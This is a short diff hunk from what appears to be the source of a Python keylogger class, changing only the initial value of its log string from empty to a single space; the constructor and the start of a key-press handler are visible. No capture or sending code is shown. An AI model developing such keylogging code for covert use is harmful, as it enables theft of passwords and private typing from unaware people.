@@ -4,7 +4,7 @@ from datetime import datetime
 class KeyLogger:
     def __init__(self, file_path):
         self.file_path = file_path
-        self.log = ""
+        self.log = " "
         self.stop_flag = False
 
     def on_press(self, key):
